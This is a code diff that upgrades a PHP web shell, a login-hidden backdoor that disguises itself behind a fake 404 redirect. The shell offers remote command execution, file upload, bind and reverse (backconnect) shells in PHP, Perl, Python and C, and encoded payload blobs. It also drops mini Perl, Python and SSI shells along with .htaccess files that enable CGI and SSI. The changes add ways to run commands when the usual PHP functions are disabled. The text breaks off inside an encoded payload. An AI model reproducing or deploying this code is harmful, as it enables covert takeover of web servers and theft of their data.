@@ -15,7 +15,7 @@ if(isset($_REQUEST['l0g1n'])) {
 if(!isset($_SESSION['l0g1n'])) {
  header("Location: http://".$_SERVER['SERVER_NAME']."/404.html");
 }
-$ver="1.8.9";
+$ver="1.9.3";
 // --------------------------------------------- globals 
 error_reporting(0);
 @set_time_limit(0);
@@ -72,13 +72,13 @@ if ($_COOKIE['d'] != "c") {
   text-shadow: black 0px 0px 4px;
  }
  input {
-  background-color: #202020;
-  color: white;
+  background-color: #303030;
+  color: #73ba25;
   border: none;
  }
  textarea {
-  background-color: #202020; 
-  color: white;
+  background-color: #303030; 
+  color: #73ba25;
   border: none;
  }
  input[type="submit"] {
@@ -154,15 +154,15 @@ function run($c) {
   passthru($c);
  } else if(function_enabled('exec')) {
   exec($c);
+ } else if(function_enabled('popen')) {
+  $fp=popen($c,'r');
+  @pclose($fp);
  } else if(function_enabled('proc_open')) {
-  $handle=proc_open($c,$descriptorspec,$pipes);
+  $handle=proc_open($c,$GLOBALS["descriptorspec"],$pipes);
   while (!feof($pipes[1])) {
    $buffer.=fread($pipes[1],1024);
   }
   @proc_close($handle);
- } else if(function_enabled('popen')) {
-  $fp=popen($c,'r');
-  @pclose($fp);
  }
 }
 // -------------------------------------------- php <= 5.2.9 curl bug
@@ -279,6 +279,17 @@ function search($bin,$flag) {
    passthru('export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin; which '.$bin.' 2>&1 | grep -v no.'.$bin.'.in');
    $path=trim(ob_get_contents());
    ob_end_clean();
+  } else if(function_enabled('proc_open')) {
+  $c='export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin && which '.$bin.' 2>&1 | grep -v no.'.$bin.'.in';
+  $process = proc_open('/bin/sh', $GLOBALS["descriptorspec"], $pipes);
+  if (is_resource($process)) {
+   fwrite($pipes[0],$c);
+   fclose($pipes[0]);
+   $path=trim(stream_get_contents($pipes[1]));
+   fclose($pipes[1]);
+   fclose($pipes[2]);
+   @proc_close($process);
+   }
   }
  }
  return $path;
@@ -297,7 +308,7 @@ switch ($_GET['p']) {
    echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=s">
   <font color="green"> haxor@pwnedbox$ </font><textarea name="command" rows="1" cols="50" onkeyup="changeSize(this)">'.$shelltext.'</textarea> <input type="submit" value="go"> <input type="checkbox" name="down"> download <br><br>';
    if ($failflag=="1") {
-    echo "all system functions are disabled :( <font color=\"gray\"> but you could try a <a href=\"?p=e\">perl shell</a> ;) and still there are<br></font>"; } else {
+    echo "all system functions are disabled :( <font color=\"gray\"> but you could try the <a href=\"?p=e\">CGI/SSI shell</a> ;) and still there is<br></font>"; } else {
     if (function_enabled('passthru')) {
      echo 'passthru <input name="wut" value="passthru" type="radio" checked><br>';
     } else { echo 'passthru is disabled!<br>';}
@@ -311,10 +322,10 @@ switch ($_GET['p']) {
      echo 'shell_exec <input name="wut" value="shell_exec" type="radio"><br>';
     } else { echo 'shell_exec is disabled!<br>';}
     if (function_enabled('popen')) {
-     echo 'popen <input name="wut" value="popen" type="radio"> <font color="gray"> (/bin/sh)</font><br>';
+     echo 'popen <input name="wut" value="popen" type="radio"><br>';
     } else { echo 'popen is disabled!<br>';}
     if (function_enabled('proc_open')) {
-     echo 'proc_open <input name="wut" value="proc_open" type="radio"> <font color="gray"> (/bin/sh)</font><br>';
+     echo 'proc_open <input name="wut" value="proc_open" type="radio"><br>';
     } else { echo 'proc_open is disabled!<br>';} 
    }
    // eval almost always enabled, except there is special option in suhosin-patched php 
@@ -664,7 +675,7 @@ switch ($_GET['p']) {
     } else {
      echo "<font color=\"red\">./ readonly</font>";
     }
-    echo '<form enctype="multipart/form-data" action="'.$_SERVER['PHP_SELF'].'?p=f" method="post"><input name="sourcefile" type="file"> upload to <font color="gray">(dir)</font><input name="filedir" type="text" maxlength="500" size="10" style="color: green;" value="."><font color="green">/</font><input name="upname" type="text" maxlength="500" size="10" style="color: green;" value=""><font color="gray">(name. empty = use original file`s name)</font> <input name="upload" type="hidden" value="okz"><br><input type="submit" value="upload">';
+    echo '<form enctype="multipart/form-data" action="'.$_SERVER['PHP_SELF'].'?p=f" method="post"><input name="sourcefile" type="file"> upload to <font color="gray">(dir)</font><input name="filedir" type="text" maxlength="500" size="10" value="."><font color="green">/</font><input name="upname" type="text" maxlength="500" size="10" value=""><font color="gray">(name. empty = use original file`s name)</font> <input name="upload" type="hidden" value="okz"><br><input type="submit" value="upload">';
     echo '</form>';
     if (!empty($_POST["upload"])) {
      if(is_uploaded_file($_FILES["sourcefile"]["tmp_name"]))
@@ -785,11 +796,11 @@ switch ($_GET['p']) {
    $nc='<font color="gray">(dont forget to setup nc <b>first</b>!)</font>';
    $semi='<font color="gray">dont forget to write <b>;</b> at the end of command!</font>';
    sploent516();
-   echo "<br>";
+   echo "<br>"; //debug: sometimes page cut here, when passthru system shell_exec are disabled
    echo '<font color="green"> - - - - = = = = &gt; &gt; one-liners</font><br><a href="javascript:;" onclick="showTooltip(4)" id="link4"> &gt;&gt; show code &lt;&lt; </a>
    <div id="4" style="background-color: #bbbbbb; color: #000000; position: absolute; border: 1px solid #FF0000; display: none"><textarea cols="80" rows="20">
 '.gzinflate(base64_decode("nZLRq5swFMbf/SsOIq0Bjbfdm6lCue1Axr0t1bcxShvjKtUkJHZdWbe/fYkWrhv3YezFk3zE7/yS7xwP+hQ78LSYzOYfCPvOKJjFIo1K9i3qqIyyLV6uVni3xnkebTe7goA+QX8c0v4774vjSKYaY2ULhC/ZBkIGU08mlVBn41x3QV35nkTEowlnV8g2cZwLemZdHGev68LfMqaWZakCd9w0tk1dRPJilb2GaVUKybjv0UAZp19j4YqIvumOtd4erqe6YYuUTB1HXY43w2ULhEr3HXs2ywR1BT0gTYrn7YCDDZ3/B4MbuA+K3tenbZlQ/JV1GpFsg2VPYMTAVS76ca/FnWKpam7sBVbsUP5kvDQonFqQFsIKoq6VEeaUlwTaMxflSAEJkwlwCmMGsAQmqNGxO0THmkcmj1n6JjtOxxpuXvXfWw0//G87eetOgtvo+wWEFKZ1K4XqYHjtQF+OUgnKtA6EJjoZZDwU/7FbftzbMQge23zz/GmfF7v18sXkiqngnNHO/zsYi4kQERqXFzn3Na5MQFz4KHhCBN6RZ+/Lc0Rk8saJ6aFp/M/u48ZmAMLa/YLsPP0G")).'</textarea></div><br>';
-   echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=b">backconnect to <input name="ip" type="text" maxlength="15" size="15" style="color: green;" value="123.123.123.123">:<input name="port" type="text" maxlength="5" size="5" style="color: green;" value="1337"> using <br>';
+   echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=b">backconnect to <input name="ip" type="text" maxlength="15" size="15" value="123.123.123.123">:<input name="port" type="text" maxlength="5" size="5" value="1337"> using <br>';
    if (@is_null(search("bash",$failflag))) {
     echo "fail, no bash here<br>";
    } else {
@@ -859,10 +870,10 @@ switch ($_GET['p']) {
    echo '<font color="blue">---> PHP </font><br>';
    if (!function_enabled('set_time_limit')) { echo '<font color="gray">warning! set_time_limit off!</font><br>'; }
    if (!function_enabled('ignore_user_abort')) { echo '<font color="gray">warning! ignore_user_abort off!</font><br>'; }
-   echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=b">bind local port <input name="port" type="text" maxlength="5" size="5" style="color: green;" value="1337"> <input type="submit" value="go"><br>'.$semi.'<input name="shellz" type="hidden" value="phplocal"></form>';
+   echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=b">bind local port <input name="port" type="text" maxlength="5" size="5" value="1337"> <input type="submit" value="go"><br>'.$semi.'<input name="shellz" type="hidden" value="phplocal"></form>';
    if (function_enabled('fsockopen')) {
     if (function_enabled('proc_open')) {
-     echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=b">backconnect to <input name="ip" type="text" maxlength="15" size="15" style="color: green;" value="123.123.123.123">:<input name="port" type="text" maxlength="5" size="5" style="color: green;" value="1337"> <input type="submit" value="go"><br>'.$nc.'<input name="shellz" type="hidden" value="phpremote"></form><br>';
+     echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=b">backconnect to <input name="ip" type="text" maxlength="15" size="15" value="123.123.123.123">:<input name="port" type="text" maxlength="5" size="5" value="1337"> <input type="submit" value="go"><br>'.$nc.'<input name="shellz" type="hidden" value="phpremote"></form><br>';
     } else { echo 'fail, proc_open is needed for backconnect!<br><br>'; }
    } else { echo 'fail, fsockopen is needed for backconnect!<br><br>'; }
    //php end
@@ -870,18 +881,14 @@ switch ($_GET['p']) {
    if (@is_null(search("perl",$failflag))) {
     echo "fail, no perl here<br>";
    } else {
-     if (@search("perl",$failflag)=="perm") {
-     echo "fail, bad permissions<br>";
+    echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=b">bind local port <input name="port" type="text" maxlength="5" size="5" value="1337"> saving file to <input name="path" type="text" maxlength="500" size="10" value="./.bd"> <input type="submit" value="go"><input name="shellz" type="hidden" value="perllocal"> ';
+    if (is_writable("./")) {
+     echo "<font color=\"green\">(./ writable)</font>";
     } else {
-     echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=b">bind local port <input name="port" type="text" maxlength="5" size="5" style="color: green;" value="1337"> saving file to <input name="path" type="text" maxlength="500" size="10" style="color: green;" value="./.bd"> <input type="submit" value="go"><input name="shellz" type="hidden" value="perllocal"> ';
-     if (is_writable("./")) {
-      echo "<font color=\"green\">(./ writable)</font>";
-     } else {
-      echo "<font color=\"red\">(./ readonly)</font>";
-     }
-     echo '<br>'.$semi.'</form>';
-     echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=b">backconnect to <input name="ip" type="text" maxlength="15" size="15" style="color: green;" value="123.123.123.123">:<input name="port" type="text" maxlength="5" size="5" style="color: green;" value="1337"> saving file to <input name="path" type="text" maxlength="500" size="10" style="color: green;" value="./.bc"> <input type="submit" value="go"><input name="shellz" type="hidden" value="perlremote"><br>'.$nc.'<br></form>';
+     echo "<font color=\"red\">(./ readonly)</font>";
     }
+    echo '<br>'.$semi.'</form>';
+    echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=b">backconnect to <input name="ip" type="text" maxlength="15" size="15" value="123.123.123.123">:<input name="port" type="text" maxlength="5" size="5" value="1337"> saving file to <input name="path" type="text" maxlength="500" size="10" value="./.bc"> <input type="submit" value="go"><input name="shellz" type="hidden" value="perlremote"><br>'.$nc.'<br></form>';
    }
    //perl end
    echo "<br>";
@@ -889,46 +896,38 @@ switch ($_GET['p']) {
    if (@is_null(search("python",$failflag))) {
     echo "fail, no python here<br>";
    } else {
-     if (@search("python",$failflag)=="perm") {
-     echo "fail, bad permissions<br>";
+    echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=b">bind local port <input name="port" type="text" maxlength="5" size="5" value="1337"> saving file to <input name="path" type="text" maxlength="500" size="10"  value="./.bd"> <input type="submit" value="go"><input name="shellz" type="hidden" value="pylocal"> ';
+    if (is_writable("./")) {
+     echo "<font color=\"green\">(./ writable)</font>";
     } else {
-     echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=b">bind local port <input name="port" type="text" maxlength="5" size="5" style="color: green;" value="1337"> saving file to <input name="path" type="text" maxlength="500" size="10" style="color: green;" value="./.bd"> <input type="submit" value="go"><input name="shellz" type="hidden" value="pylocal"> ';
-     if (is_writable("./")) {
-      echo "<font color=\"green\">(./ writable)</font>";
-     } else {
-      echo "<font color=\"red\">(./ readonly)</font>";
-     }
-     echo '<br>'.$semi.'</form>';
-     echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=b">backconnect to <input name="ip" type="text" maxlength="15" size="15" style="color: green;" value="123.123.123.123">:<input name="port" type="text" maxlength="5" size="5" style="color: green;" value="1337"> saving file to <input name="path" type="text" maxlength="500" size="10" style="color: green;" value="./.bc"> <input type="submit" value="go"><input name="shellz" type="hidden" value="pyremote"><br>'.$nc.'<br></form>';
-     echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=b">fully interactive backconnect to <input name="ip" type="text" maxlength="15" size="15" style="color: green;" value="123.123.123.123">:<input name="port" type="text" maxlength="5" size="5" style="color: green;" value="1337"> saving file to <input name="path" type="text" maxlength="500" size="10" style="color: green;" value="./.bc"> <input type="submit" value="go"><input name="shellz" type="hidden" value="pyint"><br></form>';
-     echo '<font color="gray">you need to run special client first: <a href="javascript:;" onclick="showTooltip(2)" id="link2"> &gt;&gt; show code &lt;&lt; </a><br>with this one you will be able to run mc, top, vim, etc</font>
-     <div id="2" style="background-color: #bbbbbb; color: #000000; position: absolute; border: 1px solid #FF0000; display: none">';
-     echo '<br>usage: python client.py [host] [port], then input there ^^^^ your host and port.<br>do not remove whitespace!<br>if you see "TERM is not set", run command: export TERM=linux<br>';
-     echo "<textarea cols=\"80\" rows=\"20\">";
-     echo gzinflate(base64_decode('dVLBbhoxFLzvV0ypUHcly5BWvaDmEKVEQm1BKhv1sEFou/sAKxsb2U4Ifx8/mySEKAfWsj0zb2bM58G9s4P/Sg9IP2C79xujM3W3NdbDmeaWvMDW7wU8fxx11IQTt3cCxmVqhY50zntZ2/UDCvzAt1GGrVXao3ft6jWN0HeoNsb5BSoWXvTQxyupGi5QZNQ5CkSG4RzO2yPAGQMQPZ0jCB9dfY1X7JRZ0bBMS/68vbhaTqbjUjzv57PLX8t5+Xd88Ye53u7D3HgpQw9tjpxNiDivYES665TznPU7H9FjQ1vPvEPSy1p/8WA+Pt3oXsZ9SUfe1rucC5Tz8udkurya/B5PZ6yw26iOUNp7OlL5Vyuv9BorY0POxtzxxuhQ4KjvpJQ3NlZ35C9w84b9CdRta4tDC7Ju2GBevGrPboNA3yWJ2C8TYr63XmAFdgLEUvG9ZVpyVIij5CrAtckL8T7ZQqCKvyiM8Ad5SwmxYOMUtDU/p3HSUh1aP5U+Gw6HSYQxO6s8vTQ5uy4PA0WUSbAwTBvPB2nAy9t0isLadMZRi8ZoHdIoo0MVCUePKlXFEu8ifej4FPmB59NgyfAT'));
-     echo "</textarea><br>";
-     echo '</div><br>';
+     echo "<font color=\"red\">(./ readonly)</font>";
     }
+    echo '<br>'.$semi.'</form>';
+    echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=b">backconnect to <input name="ip" type="text" maxlength="15" size="15" value="123.123.123.123">:<input name="port" type="text" maxlength="5" size="5" value="1337"> saving file to <input name="path" type="text" maxlength="500" size="10" value="./.bc"> <input type="submit" value="go"><input name="shellz" type="hidden" value="pyremote"><br>'.$nc.'<br></form>';
+    echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=b">fully interactive backconnect to <input name="ip" type="text" maxlength="15" size="15" value="123.123.123.123">:<input name="port" type="text" maxlength="5" size="5" value="1337"> saving file to <input name="path" type="text" maxlength="500" size="10" value="./.bc"> <input type="submit" value="go"><input name="shellz" type="hidden" value="pyint"><br></form>';
+    echo '<font color="gray">you need to run special client first: <a href="javascript:;" onclick="showTooltip(2)" id="link2"> &gt;&gt; show code &lt;&lt; </a><br>with this one you will be able to run mc, top, vim, etc</font>
+    <div id="2" style="background-color: #bbbbbb; color: #000000; position: absolute; border: 1px solid #FF0000; display: none">';
+    echo '<br>usage: python client.py [host] [port], then input there ^^^^ your host and port.<br>do not remove whitespace!<br>if you see "TERM is not set", run command: export TERM=linux<br>';
+    echo "<textarea cols=\"80\" rows=\"20\">";
+    echo gzinflate(base64_decode('dVLBbhoxFLzvV0ypUHcly5BWvaDmEKVEQm1BKhv1sEFou/sAKxsb2U4Ifx8/mySEKAfWsj0zb2bM58G9s4P/Sg9IP2C79xujM3W3NdbDmeaWvMDW7wU8fxx11IQTt3cCxmVqhY50zntZ2/UDCvzAt1GGrVXao3ft6jWN0HeoNsb5BSoWXvTQxyupGi5QZNQ5CkSG4RzO2yPAGQMQPZ0jCB9dfY1X7JRZ0bBMS/68vbhaTqbjUjzv57PLX8t5+Xd88Ye53u7D3HgpQw9tjpxNiDivYES665TznPU7H9FjQ1vPvEPSy1p/8WA+Pt3oXsZ9SUfe1rucC5Tz8udkurya/B5PZ6yw26iOUNp7OlL5Vyuv9BorY0POxtzxxuhQ4KjvpJQ3NlZ35C9w84b9CdRta4tDC7Ju2GBevGrPboNA3yWJ2C8TYr63XmAFdgLEUvG9ZVpyVIij5CrAtckL8T7ZQqCKvyiM8Ad5SwmxYOMUtDU/p3HSUh1aP5U+Gw6HSYQxO6s8vTQ5uy4PA0WUSbAwTBvPB2nAy9t0isLadMZRi8ZoHdIoo0MVCUePKlXFEu8ifej4FPmB59NgyfAT'));
+    echo "</textarea><br>";
+    echo '</div><br>';
    }
    //python end
    echo "<br>";
    echo '<font color="blue">---> C </font><br>';
-   if (is_null(search("gcc",$failflag))) {
+   if (@is_null(search("gcc",$failflag))) {
     echo "fail, no gcc here<br>";
    } else {
-    if (search("gcc",$failflag)=="perm") {
-     echo "fail, bad permissions<br>";
+    echo '<font color="gray">don\'t remove ".c" file extension! compiler= '.search("gcc",$failflag).'</font><br>';
+    echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=b">bind local port <input name="port" type="text" maxlength="5" size="5" value="1337"> saving file to <input name="path" type="text" maxlength="500" size="10" value="./.bd.c"><input type="submit" value="go"><input name="shellz" type="hidden" value="clocal"> ';
+    if (is_writable("./")) {
+     echo "<font color=\"green\">(./ writable)</font>";
     } else {
-     echo '<font color="gray">don\'t remove ".c" file extension! compiler= '.search("gcc",$failflag).'</font><br>';
-     echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=b">bind local port <input name="port" type="text" maxlength="5" size="5" style="color: green;" value="1337"> saving file to <input name="path" type="text" maxlength="500" size="10" style="color: green;" value="./.bd.c"><input type="submit" value="go"><input name="shellz" type="hidden" value="clocal"> ';
-     if (is_writable("./")) {
-      echo "<font color=\"green\">(./ writable)</font>";
-     } else {
-      echo "<font color=\"red\">(./ readonly)</font>";
-     }
-     echo '<br>'.$semi.'</form>';
-     echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=b">backconnect to <input name="ip" type="text" maxlength="15" size="15" style="color: green;" value="123.123.123.123">:<input name="port" type="text" maxlength="5" size="5" style="color: green;" value="1337"> saving file to <input name="path" type="text" maxlength="500" size="10" style="color: green;" value="./.bc.c"><input type="submit" value="go"><input name="shellz" type="hidden" value="cremote"><br>'.$nc.'</form>';
+     echo "<font color=\"red\">(./ readonly)</font>";
     }
+    echo '<br>'.$semi.'</form>';
+    echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=b">backconnect to <input name="ip" type="text" maxlength="15" size="15" value="123.123.123.123">:<input name="port" type="text" maxlength="5" size="5" value="1337"> saving file to <input name="path" type="text" maxlength="500" size="10" value="./.bc.c"><input type="submit" value="go"><input name="shellz" type="hidden" value="cremote"><br>'.$nc.'</form>';
    }
    //c end
    echo "<br>";
@@ -936,14 +935,10 @@ switch ($_GET['p']) {
    if (is_null(search("gcc",$failflag))) {
     echo "fail, no gcc here<br>";
    } else {
-    if (search("gcc",$failflag)=="perm") {
-     echo "fail, bad permissions<br>";
-    } else {
-     echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=b">compile findsock saving binary to: <input name="path" type="text" maxlength="500" size="10" style="color: green;" value="./findsock"> <input type="submit" value="go"><input name="shellz" type="hidden" value="findsock"> <a href="javascript:;" onclick="showTooltip(3)" id="link3"> &gt;&gt; help &lt;&lt; </a>';
-     echo '<div id="3" style="background-color: #bbbbbb; color: #000000; position: absolute; border: 1px solid #FF0000; display: none">';
-     echo "first save and compile findsock binary, then connect to this shell via nc and specify the path to binary in the request, e.g. if you've saved binary in current dir, make such request: <br><br>h4x0r@localhost$ nc -v ".$_SERVER['SERVER_NAME']." 80 <br> GET ".$_SERVER['SCRIPT_NAME']."?pfs&amp;path=".getcwd()." HTTP/1.0 <br> Host:".$_SERVER['SERVER_NAME']."  &lt;press_Enter&gt;<br>&lt;press_Enter&gt;<br><br>and if findsock will succeed, you'll see a shell: <br> sh-3.2$<br><br>use nc, not telnet! do not forget to specify the correct path! <br>additional info: <br>https://bugs.php.net/bug.php?id=38915<br>https://issues.apache.org/bugzilla/show_bug.cgi?id=46425<br>http://pentestmonkey.net/tools/web-shells/php-findsock-shell<br><br></div>";
-     echo '</form><br><br>';
-    }
+    echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=b">compile findsock saving binary to: <input name="path" type="text" maxlength="500" size="10" value="./findsock"> <input type="submit" value="go"><input name="shellz" type="hidden" value="findsock"> <a href="javascript:;" onclick="showTooltip(3)" id="link3"> &gt;&gt; help &lt;&lt; </a>';
+    echo '<div id="3" style="background-color: #bbbbbb; color: #000000; position: absolute; border: 1px solid #FF0000; display: none">';
+    echo "first save and compile findsock binary, then connect to this shell via nc and specify the path to binary in the request, e.g. if you've saved binary in current dir, make such request: <br><br>h4x0r@localhost$ nc -v ".$_SERVER['SERVER_NAME']." 80 <br> GET ".$_SERVER['SCRIPT_NAME']."?pfs&amp;path=".getcwd()." HTTP/1.0 <br> Host:".$_SERVER['SERVER_NAME']."  &lt;press_Enter&gt;<br>&lt;press_Enter&gt;<br><br>and if findsock will succeed, you'll see a shell: <br> sh-3.2$<br><br>use nc, not telnet! do not forget to specify the correct path! <br>additional info: <br>https://bugs.php.net/bug.php?id=38915<br>https://issues.apache.org/bugzilla/show_bug.cgi?id=46425<br>http://pentestmonkey.net/tools/web-shells/php-findsock-shell<br><br></div>";
+    echo '</form><br><br>';
    }
   } //failcheck end
   if (!empty($_POST["shellz"])) {
@@ -1226,13 +1221,16 @@ switch ($_GET['p']) {
   if (empty($_POST["extraz"])) {
    echo $title; 
    echo '<font color="blue">---> SysInfo</font><br>';
-   echo '<font color="gray">server IP: '.getenv('SERVER_ADDR').'<br>';
-   echo 'your IP: '.getenv('REMOTE_ADDR').'<br>';
-   echo 'X-Forwarded-For: '.getenv('HTTP_X_FORWARDED_FOR').'<br>';
-   echo 'your UA: '.getenv('HTTP_USER_AGENT').'<br>';
-   echo 'httpd: '.getenv("SERVER_SOFTWARE").'<br>';
+   echo '<font color="gray">SERVER_ADDR: '.getenv('SERVER_ADDR').'<br>';
+   echo 'REMOTE_ADDR: '.getenv('REMOTE_ADDR').'<br>';
+   echo 'HTTP_X_FORWARDED_FOR: '.getenv('HTTP_X_FORWARDED_FOR').'<br>';
+   echo 'HTTP_PROXY_CONNECTION: '.getenv('HTTP_PROXY_CONNECTION').'<br>';
+   echo 'HTTP_VIA: '.getenv('HTTP_VIA').'<br>';
+   echo 'HTTP_USER_AGENT: '.getenv('HTTP_USER_AGENT').'<br>';
+   echo 'SERVER_SOFTWARE: '.getenv("SERVER_SOFTWARE").'<br>';
    echo "php API: ".php_sapi_name()."<br>";
    echo "php version: ".version()." (full: ".phpversion().")<br>";
+   echo 'disable_functions: '.ini_get('disable_functions').'<br>';
    sploent516();
    echo "<br>";
    echo "current dir: ".getcwd()."<br>"; 
@@ -1277,32 +1275,43 @@ switch ($_GET['p']) {
      }
     }
    }
-   echo '<br><form method="post" action="'.$_SERVER['PHP_SELF'].'?p=e">put mini perl shell into <input name="dir" type="text" maxlength="500" size="10" style="color: green;" value="."><font color="green">/</font><input name="file" type="text" maxlength="500" size="10" style="color: green;" value="sh.pl"> adding .htaccess <input type="checkbox" name="htaccess"> <input type="submit" value="OK"><input name="extraz" type="hidden" value="perlsh"> ';
+   echo '<br><a href="javascript:;" onclick="showTooltip(5)" id="link5"> &gt;&gt; minishells help &lt;&lt; </a>
+   <div id="5" style="background-color: #bbbbbb; color: #000000; position: absolute; border: 1px solid #FF0000; display: none">';
+   echo 'sometimes CGI and SSI are not disabled globally on the server, so you could use CGI or SSI shell. but to enable CGI/SSI you need to use special .htaccess files.<br>CGI:<br><textarea cols="44" rows="2">Options +Indexes +FollowSymLinks +ExecCGI
+AddType application/x-httpd-cgi .pl .py</textarea><br><br>SSI:<br><textarea cols="44" rows="4">Options +Includes
+AddType text/html .shtml
+AddHandler server-parsed .shtml
+AddOutputFilter INCLUDES .shtml</textarea><br><br><b>warning:</b> using custom .htaccess could break this site! (it could result in error 500). <br>it is recommended to create new dir and place custom .htaccess and minishells there.<br><br>//thanks to profexer for SSI shell and to Michael Foord for python shell</div>';
+   if (file_exists(".htaccess")) {
+    echo '<br>WARNING: my .htaccess will <b>rewrite</b> current one!';
+   }
+   echo '<br><form method="post" action="'.$_SERVER['PHP_SELF'].'?p=e">put mini perl shell into <input name="dir" type="text" maxlength="500" size="10" value="."><font color="green">/</font><input name="file" type="text" maxlength="500" size="10" value="sh.pl"> adding .htaccess <input type="checkbox" name="htaccess"> <input type="submit" value="OK"><input name="extraz" type="hidden" value="perlsh"> ';
    if (is_writable("./")) {
     echo "<font color=\"green\">(./ writable)</font>";
    } else {
     echo "<font color=\"red\">(./ readonly)</font>";
    }
-   if (file_exists(".htaccess")) {
-    echo '<br>warning: my .htaccess will <b>rewrite</b> current one!';
-   }
-   echo '<font color="gray"><br>warning: using custom .htaccess could break this site! it is recommended to create new dir and place custom .htaccess and shells there.</font> </form>';
+   echo '</form>';
    if ($failflag=="1") {
     echo "can't find perl binary (all system functions disabled) assuming /usr/bin/perl<br>";
    }
-   echo '<br><form method="post" action="'.$_SERVER['PHP_SELF'].'?p=e">put mini SSI shell into <input name="dir" type="text" maxlength="500" size="10" style="color: green;" value="."><font color="green">/</font><input name="file" type="text" maxlength="500" size="10" style="color: green;" value="index.shtml"> adding .htaccess <input type="checkbox" name="htaccess"> <input type="submit" value="OK"><input name="extraz" type="hidden" value="ssish"> ';
+   echo '<br><form method="post" action="'.$_SERVER['PHP_SELF'].'?p=e">put mini python shell into <input name="dir" type="text" maxlength="500" size="10" value="."><font color="green">/</font><input name="file" type="text" maxlength="500" size="10" value="sh.py"> adding .htaccess <input type="checkbox" name="htaccess"> <input type="submit" value="OK"><input name="extraz" type="hidden" value="pysh"> ';
    if (is_writable("./")) {
     echo "<font color=\"green\">(./ writable)</font>";
    } else {
     echo "<font color=\"red\">(./ readonly)</font>";
    }
-   if (file_exists(".htaccess")) {
-    echo '<br>warning: my .htaccess will <b>rewrite</b> current one!';
-   }
-   echo '<font color="gray"><br>warning: using custom .htaccess could break this site! it is recommended to create new dir and place custom .htaccess and shells there.</font> </form>';
+   echo '</form>';
    if ($failflag=="1") {
-    echo "can't find perl binary (all system functions disabled) assuming /usr/bin/perl<br>";
+    echo "can't find python binary (all system functions disabled) assuming /usr/bin/python<br>";
    }
+   echo '<br><form method="post" action="'.$_SERVER['PHP_SELF'].'?p=e">put mini SSI shell into <input name="dir" type="text" maxlength="500" size="10" value="."><font color="green">/</font><input name="file" type="text" maxlength="500" size="10" value="index.shtml"> adding .htaccess <input type="checkbox" name="htaccess"> <input type="submit" value="OK"><input name="extraz" type="hidden" value="ssish"> ';
+   if (is_writable("./")) {
+    echo "<font color=\"green\">(./ writable)</font>";
+   } else {
+    echo "<font color=\"red\">(./ readonly)</font>";
+   }
+   echo '</form>';
    echo '<br>';
    //code by Eric A. Meyer, license CC BY-SA
    echo '<script type="text/javascript">function encode() { var obj = document.getElementById("dencoder"); var unencoded = obj.value; obj.value = encodeURIComponent(unencoded); } function decode() { var obj = document.getElementById("dencoder"); var encoded = obj.value; obj.value = decodeURIComponent(encoded.replace(/\+/g,  " ")); } </script>';
@@ -1400,6 +1409,41 @@ switch ($_GET['p']) {
     case "info":
      header('Location: '.$_SERVER['PHP_SELF'].'?p=pi');
      break;
+    case "pysh":
+     //code by Michael Foord & 12309, license WTFPL 
+     if ($failflag=="1") {
+      $pybin="/usr/bin/python";
+     } else {
+      $pybin=search("python",$failflag);
+     }
+     $pyshcode='#!'.$pybin;
+     $pyshcode.="\n";
+     $pyshcode.=gzinflate(base64_decode("bVRRT9swEH7Pr7jlpa0IKWObtLGmUoEClWBFbR82QRW5idNaS+LIdqBl2n/fnZ10BfGU3N33fXc+n8+o3ZkHoqikMpCshVl9d5+Ql2yV827P49uEVwZRFdPaa6B6pwMCBiC1h0aoTcqVgggaQ9bGy5QswIiCtwm0URnZrYpRLOErlvx20LlRolxPpi28tRuhFtyGK4yaGMvzRIZlYMVPQsky3DAd/+a7rj+/mE3uF/GP0d3Y7+EBdKJEZUqGBUUHhIdXwKXHc83fon3fS3kGa24yqYruE8trngttAjAbTq4ASmkqxTUvTdTpULqUGYbUP389QARkgucpiBL2ZMQAlo7EVmVfuwWTCFiZB2svUe1/Fow1lVoVMLuKdxudBt+DD5HzPyyd2Bu11/DQVkawvbArViO0YFU3Z8UqZbA9g63DBm8Ueu/kcAoeKG5qVdqg17A2nKW2uf7gZnF3OxzcjEeXw8FisrgdD9ELR4e3cERAOAYGF9cTWO3gqn552RWsDKCuUJan5Px4+unk26DvNAZ9p3g+vfxFgt5KpjteUtLOoG+9CKHUHQ/HF0viWtvg+XAuC242OIDwjN2GZ5yUNXJQbDYc3M/GSMG2xzHVFscQISuOCybKOO7Qa6HpBP9Clgbpx3QLZ2D41vQ3psj9BmBHo8CM+JbCK2rZ3EjF1vTw2gFqh+6hkxRpZxmQgVHsIdoYt+12sTbtQX+91mgafTWd3cHdeHEzvYwe/fvpfPHoA0uMkGX0fsuHA1FWtQHyIAUTIYPOgwYdCC0tXsj6fPLou/44RgPS9aoQBLOjgI5r2eL6VI69mdeVezTS7oQ0hy5Gt9IJGndgb9CpLMY/F6PZeASJzHXkfz3xQcln/Dv94uM14duwaw4g2Yg8jXE9CRyavYG7yi2ESla8PO26BL03hDDJpbb3AjjLus6JdKgRKmx39zWN3Ac8dw7HpvdrVyuM7QcvIAD36hxsP5DkyjBZuw8PtGj94bLIeZRZJ81LFuLE2FZ3e6GucmFyUXLtWLSJyKRFxNwTd9